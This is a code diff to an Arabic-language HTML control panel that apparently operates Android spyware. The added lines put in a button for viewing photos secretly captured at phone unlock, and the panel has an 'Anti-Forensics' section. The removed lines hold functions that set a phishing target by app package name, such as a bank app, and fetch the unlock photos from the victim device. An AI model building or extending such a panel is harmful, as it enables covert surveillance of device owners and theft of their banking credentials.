@@ -292,6 +292,9 @@
                                 🔓 إيقاف
                             </button>
                         </div>
+                        <button onclick="loadUnlockPhotos()" style="width:100%;margin-top:8px;background:#FFD700;color:#000;border:none;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">
+                            📊 عرض الصور الملتقطة
+                        </button>
                     </div>
 
                     <!-- 🕵️ Anti-Forensics -->
@@ -540,28 +543,6 @@
         const iframe = document.getElementById('mapFrame');
         if (iframe) iframe.src = iframe.src;
     }
-
-    // ═══════════════════════════════════════════════════════
-    // 🆕 دوال جديدة — قسم Admin
-    // ═══════════════════════════════════════════════════════
-
-    // 🎣 Auto-Phishing
-    function startPhishing() {
-        const target = document.getElementById('phishingTarget').value.trim();
-        if (!target) { alert('اكتب اسم الحزمة (مثلاً: com.bank.app)'); return; }
-        if (typeof sendCommand === 'function') {
-            sendCommand('set_phishing_target', { target: target });
-        } else {
-            alert('✅ تم تفعيل الفيشينج على: ' + target);
-        }
-    }
-
-    // 📊 سجل الصور التلقائية
-    function loadUnlockPhotos() {
-        if (typeof sendCommand === 'function') {
-            sendCommand('get_unlock_photos', {});
-        }
-    }
     </script>
 </body>
-            </html>
+</html>
